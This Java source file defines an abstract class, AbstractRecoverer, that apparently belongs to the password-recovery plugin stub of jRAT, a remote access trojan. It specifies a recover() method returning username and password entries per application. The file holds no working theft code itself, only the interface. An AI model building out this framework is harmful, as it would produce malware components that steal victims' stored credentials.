package jrat.plugin.recovery.stub.programs;

import java.util.List;

public abstract class AbstractRecoverer {
	
	/**
	 * @return A list of string arrays for each entry, sorted in the order username, password, other
	 * @throws Exception
	 */
	public abstract List<String[]> recover() throws Exception;
	
	/**
	 * @return the name of the application
	 */
	public abstract String getName();

}
